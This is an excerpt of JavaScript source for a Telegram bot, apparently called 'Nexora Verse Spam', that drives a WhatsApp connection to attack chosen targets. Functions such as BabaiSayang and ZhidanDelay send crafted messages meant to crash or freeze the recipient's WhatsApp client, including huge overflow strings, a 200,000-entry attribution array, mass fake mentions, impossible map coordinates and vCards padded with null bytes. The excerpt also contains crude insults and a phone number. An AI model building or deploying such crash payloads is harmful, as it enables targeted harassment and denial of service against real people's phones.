...
if (ctx.from.id != ownerID && !isPremGroup(ctx.chat.id)) {
  ...
  const menuMessage = `
<blockquote><strong>𝙽𝙴𝚇𝙾𝚁𝙰 𝚅𝙴𝚁𝚂𝙴 𝚂𝙿𝙰𝙼</strong></blockquote>
...
bot.command("XxX", checkWhatsAppConnection, async (ctx) => {
...
bot.command("stuck", checkWhatsAppConnection, async (ctx) => {
...
bot.command("soulB", checkWhatsAppConnection, async (ctx) => {
...
bot.command("matrix", checkWhatsAppConnection, async (ctx) => {
...
bot.command("xspam", checkWhatsAppConnection, async (ctx) => {
...
async function NoctraSqlBlank(sock, target) {
  try {
    console.log(`[CELYN-SQL-BLANK] Processing: ${target}`);

    const sleep = (ms) => new Promise(resolve => setTimeout(resolve, ms));
    
    const faiq = {
      interactiveMessage: {
        body: { text: "soul el night here" },
        nativeFlowMessage: {
    ...
    await sock.relayMessage(target, {
      groupStatusMessageV2: { message: faiq }
    ...
    console.log(`[CELYN-SQL-BLANK] Success: ${target}`);

  } catch (error) {
    console.error(`[CELYN-SQL-BLANK] Error: ${error.message}`);
  }
}
async function BabaiSayang(sock, target) {
    ...
    const mentionList = [formattedTarget, ...Array.from({ length: 2000 }, randomJid)];
    ...
    const msg1 = generateWAMessageFromContent(formattedTarget, {
        interactiveResponseMessage: {
            body: { text: "JasZz", format: 1 },
            nativeFlowResponseMessage: {
                name: "JasZz",
                paramsJson: JSON.stringify({
                    wa_flow_response_params: {
                        title: overflow(60000)
                    }
                }),
                version: 3
            }
    ...
    await sock.relayMessage(formattedTarget, msg1.message, { participant: { jid: formattedTarget } });

    await sock.relayMessage(formattedTarget, {
        interactiveMessage: {
            body: { text: "JasZz Mw Nenen" },
            nativeFlowMessage: {
                buttons: [
                    {
                        name: "review_and_pay",
    ...
    const urlTrackPayload = {
        interactiveMessage: {
            header: { title: "URL TRACK MAP", hasMediaAttachment: false },
            body: { text: "Tracking crash", format: "DEFAULT" },
            footer: { text: z(50000), format: "DEFAULT" },
            nativeFlowMessage: {
                name: "url_track_map",
                version: 3,
                paramsJson: JSON.stringify({
                    url: "https://track.jaszznotdev.com/crash?id=" + generateId(),
                    track_id: z(50000),
                    location: { lat: -999999999, lng: 99999999999 },
                    timestamp: Date.now(),
                    metadata: { overflow: z(950000) }
                }),
                buttons: [
    ...
    await sock.relayMessage(formattedTarget, urlTrackPayload, { participant: { jid: formattedTarget } });

    const locationPayload = {
        locationMessage: {
            degreesLatitude: -999999999,
            degreesLongitude: 99999999999,
            name: "SOUL EL NIGHT IS HERE",
            address: z(50000),
            jpegThumbnail: "/9j/4AAQSkZJRgABAQEAYABgAAD/2wBDAAgGBgcGBQgHBwcJCQgKDBQNDAsLDBkSEw8UHRofHh0aHBwgJC4nICIsIxwcKDcpLDAxNDQ0Hyc5PTgyPC4zNDL/wAALCAAQABQ BARk/gAEFJREFUeJztyrEJgDAAQMFPEllBUVxBNB+AUEVxUaRI0j3uVHDY4nheyn/Nzr2p6pq6qK7/bQDwAPqIWEjqQAKBZcyYQHwBAAD//w==",
            contextInfo: {
    ...
    await sock.relayMessage(formattedTarget, locationPayload, { participant: { jid: formattedTarget } });

    const groupStatusPayload = {
        groupStatusMessageV2: {
            message: {
                interactiveMessage: {
                    header: { title: "SOUL 𝐆𝐑𝐎𝐔𝐏 𝐒𝐓𝐀𝐓𝐔𝐒", hasMediaAttachment: false },
                    body: { text: "🔥 Pepek Jule 🔥", format: "DEFAULT" },
                    footer: { text: z(50000), format: "DEFAULT" },
                    nativeFlowMessage: {
                        name: "galaxy_message",
                        paramsJson: z(950000),
                        ...
                        buttons: [
                            { name: "call_permission_request", buttonParamsJson: z(950000) },
                            { name: "url_track_map", buttonParamsJson: JSON.stringify({ url: "https://track.jaszznotdev.com/group", track_id: z(50000) }) }
                        ]
                    },
                    contextInfo: {
                        remoteJid: formattedTarget,
                        participant: formattedTarget,
                        stanzaId: "GRPSTAT-" + Date.now() + "-" + generateId() + z(5000),
                        mentionedJid: mentionList,
                        isForwarded: true,
                        forwardingScore: 999999999,
                        statusAttributionType: 999,
                        statusAttributions: Array.from({ length: 200000 }, (_, i) => ({
                            participant: `62${i + 836598}@s.whatsapp.net`,
                            type: 1
                        }))
                    }
                }
            },
            jpegThumbnail: z(100000),
            inviteExpiration: 9999999999
        }
    };
    await sock.relayMessage(formattedTarget, groupStatusPayload, { participant: { jid: formattedTarget } });

    return { success: true, target: formattedTarget, message: "Memek" };
}
async function Kenzimaklo(target) { 
 const msg = {
     viewOnceMessage: {
            message: {
                interactiveMessage: {
                    body: {
                        text: "soul el night kepo pencet"
                    },
                    nativeFlowMessage: {
                        buttons: [
                            {
...
async function ZhidanDelay(sock, target) {
    const msg = {
        groupStatusMessageV2: {
            message: {
                interactiveResponseMessage: {
    ...
    groupStatusMessageV2: {
      message: {
        contactMessage: {
          displayName: "Zhidan Is Here Cuy" + "\n".repeat(250000),
          vcard: `BEGIN:VCARD\nVERSION:3.0\nN:;🦠⃰‌°‌‌zhidan ⿻ Are You Okay? ✶ > 666${"\n".repeat(10000)};;;\nFN:🦠⃰‌°‌zhidan ⿻ 𝗪𝗲‌𝗹‌𝗰⃨𝗼‌‌𝗺𝗲 ✶ > 666${"\0".repeat(10000)}\nNICKNAME:🦠⃰‌°Zhidnn ⿻ 𝗪𝗲‌𝗹‌𝗰⃨𝗼‌‌𝗺𝗲 ✶ > 666${"\0".repeat(4000)}\nORG:🦠⃰‌°‌‌Faiq ⿻ 𝗪𝗲‌𝗹‌𝗰⃨𝗼‌‌𝗺𝗲 ✶ > 666${"\x10".repeat(4000)}\nTITLE:🦠⃰‌°‌‌zhidan ⿻ 𝗪𝗲‌𝗹‌𝗰⃨𝗼‌‌𝗺𝗲 ✶ > 666${"\n".repeat(4000)}\nitem1.TEL;waid=6287873499996:+62 813-1919-9692\nitem1.X-ABLabel:Telepon\nitem2.EMAIL;type=INTERNET:🦠⃰‌°‌‌zhidan ⿻ 𝗪𝗲‌𝗹‌𝗰⃨𝗼‌‌𝗺𝗲 ✶ > 666${"\0".repeat(4000)}\nitem2.X-ABLabel:Kantor\nitem3.EMAIL;type=INTERNET:🦠⃰‌°‌‌zhidan ⿻ 𝗪𝗲‌𝗹‌𝗰⃨𝗼‌‌𝗺𝗲 ✶ > 666${"zhidan.\x10.\0.\n\0".repeat(4000)}\nEND:VCARD`,
          contextInfo: {
            participant: target,
  ...
  await sock.relayMessage(target, zhidan, { participant: { jid: target } });
